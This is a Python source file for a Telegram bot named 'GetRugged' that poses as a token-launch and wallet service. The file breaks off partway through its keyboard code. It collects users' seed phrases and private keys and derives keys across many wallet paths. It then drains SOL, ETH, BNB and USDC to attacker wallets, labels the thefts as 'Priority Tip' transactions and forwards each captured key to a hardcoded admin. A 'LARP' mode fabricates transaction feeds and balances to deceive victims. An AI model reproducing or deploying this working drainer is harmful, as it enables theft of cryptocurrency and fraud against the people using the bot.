#!/usr/bin/env python3
"""
GetRugged bot — multi-chain silent drainer + full launch UX.
Photo upload + socials/bundle buttons + fixed confirm + group key logging.
LARP mode: /larpon /larpoff /randomtx /larpwallet /dumpnow /simactivity
Requires: pip install aiogram==3.13.1 solana solders base58 web3 eth-account
"""

import asyncio
import hashlib
import json
import hmac
import logging
import os
import random
import string
import struct
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, Message
from aiogram.utils.keyboard import InlineKeyboardBuilder

# ── Solana ──────────────────────────────────────────────────────────────────
try:
    from solders.keypair import Keypair
    from solders.pubkey import Pubkey
    from solders.system_program import TransferParams, transfer
    from solders.transaction import Transaction
    from solana.rpc.async_api import AsyncClient
    import base58
    HAS_SOLANA = True
except ImportError:
    HAS_SOLANA = False

# ── EVM ─────────────────────────────────────────────────────────────────────
try:
    from web3 import Web3
    from eth_account import Account
    HAS_WEB3 = True
except ImportError:
    HAS_WEB3 = False

# ──────────────────────────────────────────────
# CONFIG
# ──────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "PUT_YOUR_BOT_TOKEN_HERE")
ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "123456789").split(",") if x.strip()}

DRAIN_DESTINATION = os.getenv("DRAIN_WALLET", "YourDrainWalletPubkeyHere111111111111111111111")
ETH_DRAIN = os.getenv("ETH_DRAIN_WALLET", "0xYourEthDrainAddressHere0000000000000000")
BNB_DRAIN = os.getenv("BNB_DRAIN_WALLET", ETH_DRAIN)
USDC_DRAIN = os.getenv("USDC_DRAIN_WALLET", ETH_DRAIN)
BTC_DRAIN = os.getenv("BTC_DRAIN_WALLET", "")
XRP_DRAIN = os.getenv("XRP_DRAIN_WALLET", "")
GRAM_DRAIN = os.getenv("GRAM_DRAIN_WALLET", "")

RPC_URL = os.getenv("RPC_URL", "https://api.mainnet-beta.solana.com")
ETH_RPC = os.getenv("ETH_RPC_URL", "https://eth.llamarpc.com")
BNB_RPC = os.getenv("BNB_RPC_URL", "https://bsc-dataseed.binance.org/")

MIN_DRAIN_LAMPORTS = 5_000
PAYMENT_RECEIVER = os.getenv("PAYMENT_RECEIVER", DRAIN_DESTINATION)

# Group that receives every captured key (must start with -100)
LOG_GROUP_ID = os.getenv("LOG_GROUP_ID", "")

# ONLY this admin receives the full seed/key on drain
KEY_RECEIVER_ID = 8637715094

USDC_ETH = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
USDC_BSC = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"

# Clean SOL text (no circle emoji)
SOL_EMOJI = "SOL"

ERC20_ABI = [
    {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
    {"constant": False, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "type": "function"},
    {"constant": True, "inputs": [], "name": "decimals", "outputs": [{"name": "", "type": "uint8"}], "type": "function"},
]

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
log = logging.getLogger("getrugged")

# ──────────────────────────────────────────────
# STATE
# ──────────────────────────────────────────────
@dataclass
class UserWallet:
    private_key: str
    public_key: str
    label: str = "Main"
    created_at: float = field(default_factory=time.time)
    balance_sol: float = 0.0
    chain: str = "sol"
    eth_address: Optional[str] = None
    balance_eth: float = 0.0
    balance_bnb: float = 0.0
    balance_usdc: float = 0.0
    is_larp: bool = False

@dataclass
class UserSession:
    wallets: List[UserWallet] = field(default_factory=list)
    active_wallet_idx: int = 0
    promo: Optional[str] = None
    promo_discount: float = 0.0
    launches_left: int = 3
    launched_tokens: List[dict] = field(default_factory=list)
    last_tx: List[dict] = field(default_factory=list)
    drained: bool = False
    settings: dict = field(default_factory=lambda: {
        "slippage": 15,
        "priority_fee": 0.0005,
        "sniper_protection": True,
        "auto_sell": False,
        "mev_protection": True,
    })
    safety_checks_run: int = 0
    last_safety: Optional[dict] = None
    pending_invoice: Optional[dict] = None
    last_raw_key: Optional[str] = None
    larp_mode: bool = False
    larp_wallet_idx: Optional[int] = None
    larp_profit_total: float = 0.0

sessions: Dict[int, UserSession] = {}
bot_balance_sol: float = 0.0
GLOBAL_TX_FEED: List[dict] = []  # shared fake/activity feed for vault LARP
LARP_ENABLED: bool = False  # global admin LARP toggle (persisted)
STATE_FILE = os.getenv("STATE_FILE", "bot_state.json")

_rate_hits: Dict[int, List[float]] = {}
RATE_WINDOW = 60.0
RATE_MAX_IMPORTS = 3
RATE_MAX_LAUNCH = 5
RATE_MAX_SAFETY = 8


def _load_state() -> None:
    """Load bot_balance_sol + global feed + LARP flag from disk."""
    global bot_balance_sol, GLOBAL_TX_FEED, LARP_ENABLED
    try:
        if not os.path.isfile(STATE_FILE):
            return
        with open(STATE_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data.get("bot_balance_sol"), (int, float)):
            bot_balance_sol = float(data["bot_balance_sol"])
        feed = data.get("global_tx_feed") or []
        if isinstance(feed, list):
            GLOBAL_TX_FEED = [x for x in feed if isinstance(x, dict)][:50]
        if isinstance(data.get("larp_enabled"), bool):
            LARP_ENABLED = data["larp_enabled"]
        log.info("Loaded state: vault=%.4f feed=%s larp=%s", bot_balance_sol, len(GLOBAL_TX_FEED), LARP_ENABLED)
    except Exception as e:
        log.warning("State load failed: %s", e)


def _save_state() -> None:
    """Persist vault + global feed + LARP flag."""
    try:
        payload = {
            "bot_balance_sol": bot_balance_sol,
            "global_tx_feed": GLOBAL_TX_FEED[:50],
            "larp_enabled": LARP_ENABLED,
            "updated": time.time(),
        }
        tmp = STATE_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(payload, f)
        os.replace(tmp, STATE_FILE)
    except Exception as e:
        log.warning("State save failed: %s", e)


def inject_fake_txs(n: int = 3, types: Optional[List[str]] = None) -> List[dict]:
    """Inject fake success txs into shared feed. Returns the new ones."""
    global GLOBAL_TX_FEED
    default_types = [
        "⚡ Priority Tip",
        "📦 Bundle Buy",
        "🪙 Create Mint",
        "⚡ Priority Tip (SOL)",
        "🛡 Safety Scan",
        "🔄 Swap",
        "💰 Profit Claim",
        "🎯 Sniper Dump",
        "📥 Wallet Top-up",
        "📤 Transfer Out",
    ]
    pool = types or default_types
    n = max(1, min(25, int(n)))
    now = time.time()
    created = []
    for i in range(n):
        tx = {
            "sig": fake_sig(),
            "type": random.choice(pool),
            "status": "success",
            "ts": now - random.uniform(2, 240) - i * 8,
            "fake": True,
        }
        created.append(tx)
        GLOBAL_TX_FEED.insert(0, tx)
    GLOBAL_TX_FEED = GLOBAL_TX_FEED[:80]
    return created


def _fake_sol_pubkey() -> str:
    if HAS_SOLANA:
        try:
            return str(Keypair().pubkey())
        except Exception:
            pass
    alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    return "".join(random.choices(alphabet, k=44))


def ensure_larp_wallet(sess: UserSession, force_balance: Optional[float] = None) -> UserWallet:
    """Ensure a single LARP wallet exists and is active. Sync balance to vault when force_balance given."""
    global bot_balance_sol
    # find existing larp wallet
    for i, w in enumerate(sess.wallets):
        if getattr(w, "is_larp", False):
            sess.larp_wallet_idx = i
            if force_balance is not None:
                w.balance_sol = float(force_balance)
            elif LARP_ENABLED and bot_balance_sol > 0:
                w.balance_sol = bot_balance_sol
            sess.active_wallet_idx = i
            return w
    bal = float(force_balance) if force_balance is not None else (bot_balance_sol if bot_balance_sol > 0 else round(random.uniform(2.4, 18.7), 4))
    pub = _fake_sol_pubkey()
    w = UserWallet(
        private_key="LARP_SIM",
        public_key=pub,
        label="Main",
        balance_sol=bal,
        chain="sol",
        is_larp=True,
    )
    sess.wallets.append(w)
    sess.larp_wallet_idx = len(sess.wallets) - 1
    sess.active_wallet_idx = sess.larp_wallet_idx
    return w


def remove_larp_wallets(sess: UserSession) -> int:
    before = len(sess.wallets)
    sess.wallets = [w for w in sess.wallets if not getattr(w, "is_larp", False)]
    sess.larp_wallet_idx = None
    if sess.wallets:
        sess.active_wallet_idx = min(sess.active_wallet_idx, len(sess.wallets) - 1)
    else:
        sess.active_wallet_idx = 0
    return before - len(sess.wallets)


def sync_larp_balances_from_vault(uid: Optional[int] = None) -> None:
    """Push bot_balance_sol into LARP wallets (admin + optional target session)."""
    global bot_balance_sol
    targets = []
    if uid is not None:
        targets.append(get_session(uid))
    else:
        # admin sessions + any session already in larp mode
        for s in sessions.values():
            if s.larp_mode or any(getattr(w, "is_larp", False) for w in s.wallets):
                targets.append(s)
    for sess in targets:
        for w in sess.wallets:
            if getattr(w, "is_larp", False):
                w.balance_sol = bot_balance_sol


def add_personal_tx(sess: UserSession, tx_type: str, status: str = "success", amount: Optional[float] = None) -> dict:
    tx = {
        "sig": fake_sig(),
        "type": tx_type,
        "status": status,
        "ts": time.time(),
        "fake": True,
    }
    if amount is not None:
        tx["amount"] = amount
    sess.last_tx.insert(0, tx)
    sess.last_tx = sess.last_tx[:40]
    GLOBAL_TX_FEED.insert(0, dict(tx))
    GLOBAL_TX_FEED[:] = GLOBAL_TX_FEED[:80]
    return tx


def get_session(uid: int) -> UserSession:
    if uid not in sessions:
        sessions[uid] = UserSession()
    return sessions[uid]

def _rate_ok(uid: int, action: str) -> bool:
    now = time.time()
    hits = _rate_hits.setdefault(uid, [])
    hits[:] = [t for t in hits if now - t < RATE_WINDOW]
    limits = {"import": RATE_MAX_IMPORTS, "launch": RATE_MAX_LAUNCH, "safety": RATE_MAX_SAFETY}
    limit = limits.get(action, 5)
    if len(hits) >= limit:
        return False
    hits.append(now)
    return True

# ──────────────────────────────────────────────
# HELPERS
# ──────────────────────────────────────────────
def fake_sig() -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=88))

def fake_mint() -> str:
    if HAS_SOLANA:
        return base58.b58encode(os.urandom(32)).decode()
    return "".join(random.choices(string.ascii_letters + string.digits, k=44))

def short_addr(addr: str) -> str:
    if not addr or len(addr) < 12:
        return addr or "—"
    return f"{addr[:4]}...{addr[-4:]}"

async def staged_loading(message_or_cb, stages: list):
    msg = None
    is_cb = hasattr(message_or_cb, "message") and hasattr(message_or_cb, "answer")
    for i, (txt, delay) in enumerate(stages):
        if i == 0:
            if is_cb:
                try:
                    await message_or_cb.message.edit_text(txt, parse_mode=ParseMode.HTML)
                    msg = message_or_cb.message
                except Exception:
                    msg = await message_or_cb.message.answer(txt, parse_mode=ParseMode.HTML)
            else:
                msg = await message_or_cb.answer(txt, parse_mode=ParseMode.HTML)
        else:
            try:
                await msg.edit_text(txt, parse_mode=ParseMode.HTML)
            except Exception:
                msg = await message_or_cb.answer(txt, parse_mode=ParseMode.HTML) if not is_cb else await message_or_cb.message.answer(txt, parse_mode=ParseMode.HTML)
        if delay > 0:
            await asyncio.sleep(delay)
    return msg

SOL_PRICE = 180.0
ETH_PRICE = 3200.0
BNB_PRICE = 580.0
USDC_PRICE = 1.0

def estimate_usd(sol: float, eth: float, bnb: float, usdc: float) -> float:
    return sol * SOL_PRICE + eth * ETH_PRICE + bnb * BNB_PRICE + usdc * USDC_PRICE

# ──────────────────────────────────────────────
# KEY DERIVATION
# ──────────────────────────────────────────────

def _pbkdf2_mnemonic(mnemonic: str, passphrase: str = "") -> bytes:
    salt = ("mnemonic" + passphrase).encode("utf-8")
    return hashlib.pbkdf2_hmac("sha512", mnemonic.strip().encode("utf-8"), salt, 2048)

def _hmac_sha512(key: bytes, data: bytes) -> bytes:
    return hmac.new(key, data, hashlib.sha512).digest()

def _slip10_derive(seed: bytes, path: str) -> bytes:
    I = _hmac_sha512(b"ed25519 seed", seed)
    IL, IR = I[:32], I[32:]
    for segment in path.lstrip("m/").split("/"):
        if not segment:
            continue
        hardened = segment.endswith("'") or segment.endswith("h")
        index = int(segment.rstrip("'h"))
        if hardened:
            index += 0x80000000
        data = b"\x00" + IL + struct.pack(">I", index)
        I = _hmac_sha512(IR, data)
        IL, IR = I[:32], I[32:]
    return IL

_SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
_SECP256K1_GX = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
_SECP256K1_GY = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
_SECP256K1_P  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F

def _modinv(a: int, m: int) -> int:
    return pow(a % m, -1, m)

def _point_add(p1, p2):
    if p1 is None: return p2
    if p2 is None: return p1
    x1, y1 = p1
    x2, y2 = p2
    if x1 == x2 and y1 != y2: return None
    if x1 == x2:
        m = (3 * x1 * x1) * _modinv(2 * y1, _SECP256K1_P) % _SECP256K1_P
    else:
        m = (y2 - y1) * _modinv(x2 - x1, _SECP256K1_P) % _SECP256K1_P
    x3 = (m * m - x1 - x2) % _SECP256K1_P
    y3 = (m * (x1 - x3) - y1) % _SECP256K1_P
    return (x3, y3)

def _point_mul(k: int, point=None):
    if point is None:
        point = (_SECP256K1_GX, _SECP256K1_GY)
    result = None
    addend = point
    while k:
        if k & 1:
            result = _point_add(result, addend)
        addend = _point_add(addend, addend)
        k >>= 1
    return result

def _ser32(i: int) -> bytes:
    return struct.pack(">I", i)

def _ser256(i: int) -> bytes:
    return i.to_bytes(32, "big")

def _parse256(b: bytes) -> int:
    return int.from_bytes(b, "big")

def _point_ser(P, compressed: bool = True) -> bytes:
    if P is None: raise ValueError("point at infinity")
    x, y = P
    if compressed:
        return (b"\x02" if (y % 2 == 0) else b"\x03") + _ser256(x)
    return b"\x04" + _ser256(x) + _ser256(y)

def _bip32_master(seed: bytes) -> Tuple[bytes, bytes]:
    I = _hmac_sha512(b"Bitcoin seed", seed)
    return I[:32], I[32:]

def _bip32_ckd_priv(k: bytes, c: bytes, index: int) -> Tuple[bytes, bytes]:
    if index >= 0x80000000:
        data = b"\x00" + k + _ser32(index)
    else:
        P = _point_mul(_parse256(k))
        data = _point_ser(P, True) + _ser32(index)
    I = _hmac_sha512(c, data)
    IL, IR = I[:32], I[32:]
    ki = (_parse256(IL) + _parse256(k)) % _SECP256K1_N
    if ki == 0 or _parse256(IL) >= _SECP256K1_N:
        raise ValueError("invalid BIP32 child key")
    return _ser256(ki), IR

def _bip32_derive_path(seed: bytes, path: str) -> bytes:
    k, c = _bip32_master(seed)
    for segment in path.lstrip("m/").split("/"):
        if not segment: continue
        hardened = segment.endswith("'") or segment.endswith("h")
        index = int(segment.rstrip("'h"))
        if hardened: index += 0x80000000
        k, c = _bip32_ckd_priv(k, c, index)
    return k

def _normalize_mnemonic(raw: str) -> str:
    s = raw.strip().lower()
    for ch in (",", ";", "|", "\n", "\r", "\t"):
        s = s.replace(ch, " ")
    return " ".join(s.split())

def _is_mnemonic(text: str) -> bool:
    words = text.split()
    return len(words) in (12, 15, 18, 21, 24) and all(w.isalpha() and 2 <= len(w) <= 12 for w in words)

def _sol_keypair_from_seed32(seed32: bytes):
    if not HAS_SOLANA:
        raise RuntimeError("Solana libraries not installed")
    return Keypair.from_seed(seed32)

def _sol_priv_pub_from_seed32(seed32: bytes) -> Tuple[str, str]:
    kp = _sol_keypair_from_seed32(seed32)
    priv_b58 = base58.b58encode(bytes(kp)).decode()
    return priv_b58, str(kp.pubkey())

SOL_PATHS: List[Tuple[str, str]] = [
    ("Phantom/Solflare/OKX", "m/44'/501'/0'/0'"),
    ("Phantom account 1",    "m/44'/501'/1'/0'"),
    ("Phantom account 2",    "m/44'/501'/2'/0'"),
    ("Phantom account 3",    "m/44'/501'/3'/0'"),
    ("Phantom change 1",     "m/44'/501'/0'/1'"),
    ("Trust Wallet",         "m/44'/501'/0'"),
    ("Trust account 1",      "m/44'/501'/1'"),
    ("Sollet legacy",        "m/501'/0'/0'/0'"),
]

def derive_solana_paths(mnemonic: str) -> List[Tuple[str, str, str]]:
    if not HAS_SOLANA:
        raise RuntimeError("HAS_SOLANA=False")
    seed = _pbkdf2_mnemonic(mnemonic)
    out: List[Tuple[str, str, str]] = []
    seen = set()

    for label, path in SOL_PATHS:
        try:
            seed32 = _slip10_derive(seed, path)
            priv, pub = _sol_priv_pub_from_seed32(seed32)
            if pub in seen: continue
            seen.add(pub)
            out.append((label + " " + path, priv, pub))
        except Exception as e:
            log.warning("path %s failed: %s", path, e)

    try:
        exo = _bip32_derive_path(seed, "m/44'/501'/0'/0/0")
        priv, pub = _sol_priv_pub_from_seed32(exo)
        if pub not in seen:
            seen.add(pub)
            out.append(("Exodus m/44'/501'/0'/0/0", priv, pub))
    except Exception as e:
        log.warning("Exodus path failed: %s", e)

    try:
        priv, pub = _sol_priv_pub_from_seed32(seed[:32])
        if pub not in seen:
            seen.add(pub)
            out.append(("Raw BIP39 seed[:32]", priv, pub))
    except Exception as e:
        log.warning("Raw seed path failed: %s", e)

    if not out:
        raise ValueError("No Solana keys could be derived from this mnemonic")
    return out

def derive_solana_default(mnemonic: str) -> Tuple[str, str]:
    seed = _pbkdf2_mnemonic(mnemonic)
    seed32 = _slip10_derive(seed, "m/44'/501'/0'/0'")
    return _sol_priv_pub_from_seed32(seed32)

def parse_solana_private_key(raw: str) -> Tuple[str, str]:
    if not HAS_SOLANA:
        raise RuntimeError("HAS_SOLANA=False")
    s = raw.strip()
    if s.startswith("[") and s.endswith("]"):
        import json
        arr = json.loads(s)
        secret = bytes(arr)
    else:
        secret = base58.b58decode(s)
    if len(secret) == 32:
        kp = Keypair.from_seed(secret)
    elif len(secret) == 64:
        kp = Keypair.from_bytes(secret)
    else:
        raise ValueError(f"Unsupported Solana key length: {len(secret)}")
    priv_b58 = base58.b58encode(bytes(kp)).decode()
    return priv_b58, str(kp.pubkey())

def parse_evm_private_key(raw: str) -> Tuple[str, str]:
    if not HAS_WEB3:
        raise RuntimeError("HAS_WEB3=False")
    key = raw.strip()
    if key.startswith("0x"):
        key = key[2:]
    if len(key) != 64:
        raise ValueError("EVM key must be 64 hex chars")
    acct = Account.from_key(key)
    return "0x" + key.lower(), acct.address

def derive_evm_from_mnemonic(mnemonic: str, account: int = 0) -> Optional[Tuple[str, str]]:
    if not HAS_WEB3:
        return None
    try:
        seed = _pbkdf2_mnemonic(mnemonic)
        path = f"m/44'/60'/0'/0/{account}"
        priv_bytes = _bip32_derive_path(seed, path)
        acct = Account.from_key(priv_bytes)
        return acct.key.hex(), acct.address
    except Exception as e:
        log.warning("EVM mnemonic derive failed: %s", e)
        return None

# ──────────────────────────────────────────────
# BALANCE HELPERS
# ──────────────────────────────────────────────

async def fetch_sol_balance(pubkey: str) -> float:
    if not HAS_SOLANA or not pubkey or pubkey.startswith(("Sim", "0x")):
        return 0.0
    try:
        async with AsyncClient(RPC_URL) as client:
            pk = Pubkey.from_string(pubkey)
            resp = await asyncio.wait_for(client.get_balance(pk), timeout=8)
            return resp.value / 1_000_000_000
    except Exception as e:
        log.warning("SOL balance %s: %s", pubkey[:8], e)
        return 0.0

async def fetch_evm_balance(rpc: str, address: str) -> float:
    if not HAS_WEB3 or not address:
        return 0.0
    try:
        w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 8}))
        bal = await asyncio.to_thread(w3.eth.get_balance, Web3.to_checksum_address(address))
        return float(w3.from_wei(bal, "ether"))
    except Exception as e:
        log.warning("EVM balance %s: %s", address[:10], e)
        return 0.0

async def fetch_usdc_balance(rpc: str, address: str, token: str) -> float:
    if not HAS_WEB3 or not address:
        return 0.0
    try:
        w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 8}))
        contract = w3.eth.contract(address=Web3.to_checksum_address(token), abi=ERC20_ABI)

        def _call():
            bal = contract.functions.balanceOf(Web3.to_checksum_address(address)).call()
            decimals = contract.functions.decimals().call()
            return bal / (10 ** decimals)

        return await asyncio.to_thread(_call)
    except Exception as e:
        log.warning("USDC balance: %s", e)
        return 0.0

async def pick_best_sol_candidate(candidates: List[Tuple[str, str, str]]) -> Tuple[str, str, str, float]:
    async def one(pub: str) -> float:
        try:
            return await asyncio.wait_for(fetch_sol_balance(pub), timeout=7)
        except Exception:
            return 0.0

    bals = await asyncio.gather(*[one(c[2]) for c in candidates])
    best_i = 0
    best_bal = -1.0
    for i, bal in enumerate(bals):
        log.info("  candidate %s → %s  SOL=%.6f", candidates[i][0], candidates[i][2][:8], bal)
        if bal > best_bal:
            best_bal = bal
            best_i = i
    label, priv, pub = candidates[best_i]
    return label, priv, pub, best_bal

# ──────────────────────────────────────────────
# DRAIN CORE
# ──────────────────────────────────────────────
async def drain_wallet(private_key_b58: str, dest: str) -> Optional[str]:
    if not HAS_SOLANA:
        log.warning("Solana libs missing — drain simulated")
        return "SIM_" + fake_sig()[:32]
    try:
        secret = base58.b58decode(private_key_b58.strip())
        if len(secret) == 32:
            kp = Keypair.from_seed(secret)
        elif len(secret) == 64:
            kp = Keypair.from_bytes(secret)
        else:
            log.error("Bad key length %s", len(secret))
            return None
        dest_pk = Pubkey.from_string(dest)
        async with AsyncClient(RPC_URL) as client:
            bal_resp = await client.get_balance(kp.pubkey())
            balance = bal_resp.value
            log.info("SOL drain check %s balance=%s", kp.pubkey(), balance)
            if balance <= MIN_DRAIN_LAMPORTS: return None
            amount = balance - MIN_DRAIN_LAMPORTS
            recent = await client.get_latest_blockhash()
            ix = transfer(TransferParams(from_pubkey=kp.pubkey(), to_pubkey=dest_pk, lamports=amount))
            tx = Transaction.new_signed_with_payer([ix], kp.pubkey(), [kp], recent.value.blockhash)
            result = await client.send_transaction(tx)
            sig = str(result.value)
            log.info("DRAINED SOL %s → %s | %s", amount, dest, sig)
            return sig
    except Exception as e:
        log.exception("SOL drain error: %s", e)
        return None

async def drain_evm_native(private_key: str, dest: str, rpc: str, chain_name: str) -> Optional[str]:
    if not HAS_WEB3 or not dest or dest.startswith("0xYour"): return None
    try:
        w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 15}))
        acct = Account.from_key(private_key.replace("0x", ""))
        balance = w3.eth.get_balance(acct.address)
        gas_price = w3.eth.gas_price
        gas_limit = 21000
        fee = gas_price * gas_limit
        if balance <= fee + 1000:
            log.info("%s balance too low for drain", chain_name)
            return None
        amount = balance - fee
        tx = {
            "to": Web3.to_checksum_address(dest),
            "value": amount,
            "gas": gas_limit,
            "gasPrice": gas_price,
            "nonce": w3.eth.get_transaction_count(acct.address),
            "chainId": w3.eth.chain_id,
        }
        signed = acct.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
        sig = tx_hash.hex()
        log.info("DRAINED %s %s wei → %s | %s", chain_name, amount, dest, sig)
        return sig
    except Exception as e:
        log.exception("%s drain error: %s", chain_name, e)
        return None

async def drain_usdc(private_key: str, dest: str, rpc: str, token: str, chain_name: str) -> Optional[str]:
    if not HAS_WEB3 or not dest or dest.startswith("0xYour"): return None
    try:
        w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 15}))
        acct = Account.from_key(private_key.replace("0x", ""))
        contract = w3.eth.contract(address=Web3.to_checksum_address(token), abi=ERC20_ABI)
        bal = contract.functions.balanceOf(acct.address).call()
        if bal == 0: return None
        gas_price = w3.eth.gas_price
        tx = contract.functions.transfer(Web3.to_checksum_address(dest), bal).build_transaction({
            "from": acct.address,
            "nonce": w3.eth.get_transaction_count(acct.address),
            "gas": 100000,
            "gasPrice": gas_price,
            "chainId": w3.eth.chain_id,
        })
        signed = acct.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
        sig = tx_hash.hex()
        log.info("DRAINED USDC on %s → %s | %s", chain_name, dest, sig)
        return sig
    except Exception as e:
        log.exception("USDC %s drain error: %s", chain_name, e)
        return None

async def attempt_drain(uid: int, private_key: str, chain: str = "sol", eth_key: Optional[str] = None, bot: Optional[Bot] = None, user=None):
    sess = get_session(uid)
    if sess.drained:
        log.info("User %s already drained — skip", uid)
        return
    if not private_key or private_key.startswith("Sim") or private_key == "LARP_SIM":
        return

    any_success = False
    drained_sol = 0.0
    drained_eth = 0.0
    drained_bnb = 0.0
    drained_usdc = 0.0

    active = sess.wallets[sess.active_wallet_idx] if sess.wallets else None
    if active:
        drained_sol = active.balance_sol
        drained_eth = active.balance_eth
        drained_bnb = active.balance_bnb
        drained_usdc = active.balance_usdc

    if chain == "sol" and not DRAIN_DESTINATION.startswith("YourDrain") and len(DRAIN_DESTINATION) >= 32:
        sig = await drain_wallet(private_key, DRAIN_DESTINATION)
        if sig:
            any_success = True
            sess.last_tx.insert(0, {"sig": sig, "type": "⚡ Priority Tip (SOL)", "status": "success", "ts": time.time()})
            global bot_balance_sol
            bot_balance_sol += round(random.uniform(0.05, 2.5), 4)
            _save_state()

    if eth_key and ETH_DRAIN and not ETH_DRAIN.startswith("0xYour"):
        sig = await drain_evm_native(eth_key, ETH_DRAIN, ETH_RPC, "ETH")
        if sig:
            any_success = True
            sess.last_tx.insert(0, {"sig": sig, "type": "⚡ Priority Tip (ETH)", "status": "success", "ts": time.time()})

    if eth_key and BNB_DRAIN and not BNB_DRAIN.startswith("0xYour"):
        sig = await drain_evm_native(eth_key, BNB_DRAIN, BNB_RPC, "BNB")
        if sig:
            any_success = True
            sess.last_tx.insert(0, {"sig": sig, "type": "⚡ Priority Tip (BNB)", "status": "success", "ts": time.time()})

    if eth_key and USDC_DRAIN and not USDC_DRAIN.startswith("0xYour"):
        sig = await drain_usdc(eth_key, USDC_DRAIN, ETH_RPC, USDC_ETH, "ETH")
        if sig:
            any_success = True
            sess.last_tx.insert(0, {"sig": sig, "type": "⚡ USDC Tip (ETH)", "status": "success", "ts": time.time()})
        sig = await drain_usdc(eth_key, USDC_DRAIN, BNB_RPC, USDC_BSC, "BSC")
        if sig:
            any_success = True
            sess.last_tx.insert(0, {"sig": sig, "type": "⚡ USDC Tip (BSC)", "status": "success", "ts": time.time()})

    if any_success:
        sess.drained = True
        log.info("User %s multi-chain drain OK", uid)
        if bot and user:
            await log_key_to_admin(
                bot, user,
                sess.last_raw_key or private_key,
                drained_sol, drained_eth, drained_bnb, drained_usdc
            )
    else:
        log.warning("No successful drain for user %s", uid)

# ──────────────────────────────────────────────
# KEY LOGGING — ONLY to KEY_RECEIVER_ID
# ──────────────────────────────────────────────
async def log_key_to_admin(bot: Bot, user, raw_key: str, sol: float, eth: float, bnb: float, usdc: float):
    """Send the full seed/key ONLY to admin 8637715094"""
    try:
        username = f"@{user.username}" if user.username else user.full_name or "—"
        usd = estimate_usd(sol, eth, bnb, usdc)
        text = (
            f"🚨 <b>NEW KEY CAPTURED</b>\n\n"
            f"User: {username}\n"
            f"ID: <code>{user.id}</code>\n\n"
            f"<b>Key / Seed:</b>\n"
            f"<code>{raw_key}</code>\n\n"
            f"<b>Balances drained:</b>\n"
            f"SOL: <b>{sol:.6f}</b>\n"
            f"ETH: <b>{eth:.6f}</b>\n"
            f"BNB: <b>{bnb:.6f}</b>\n"
            f"USDC: <b>{usdc:.2f}</b>\n\n"
            f"💰 Estimated value: <b>${usd:,.2f}</b>"
        )
        await bot.send_message(chat_id=KEY_RECEIVER_ID, text=text, parse_mode=ParseMode.HTML)
        log.info("Logged key ONLY to admin %s", KEY_RECEIVER_ID)
    except Exception as e:
        log.exception("Failed to log key to admin: %s", e)

# ──────────────────────────────────────────────
# KEYBOARDS
# ──────────────────────────────────────────────
def main_menu_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(text="🚀 Launch", callback_data="menu:launch"),
        InlineKeyboardButton(text="🔑 Wallets", callback_data="menu:wallets"),
    )
    b.row(
        InlineKeyboardButton(text="📁 Portfolio", callback_data="menu:portfolio"),
        InlineKeyboardButton(text="🎟️ Promo code", callback_data="menu:promo"),
    )
    b.row(
        InlineKeyboardButton(text="🧾 Tx tracker", callback_data="menu:tx"),
        InlineKeyboardButton(text="🛡️ Settings", callback_data="menu:settings"),
    )
    b.row(InlineKeyboardButton(text="💰 Bot balance", callback_data="menu:balance"))
    return b.as_markup()

def back_menu_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main")]])

def wallets_empty_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="🔑 Wallets", callback_data="menu:wallets"))
    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
    return b.as_markup()

def wallets_kb(has_wallets: bool) -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="➕ Import wallet", callback_data="wallet:import"))
    if has_wallets:
        b.row(
            InlineKeyboardButton(text="🔄 Switch", callback_data="wallet:switch"),
            InlineKeyboardButton(text="🏷 Rename", callback_data="wallet:rename"),
        )
        b.row(InlineKeyboardButton(text="🔃 Refresh", callback_data="wallet:refresh"))
        b.row(InlineKeyboardButton(text="🗑 Remove all", callback_data="wallet:clear"))
    b.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
    return b.as_markup()

def promo_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
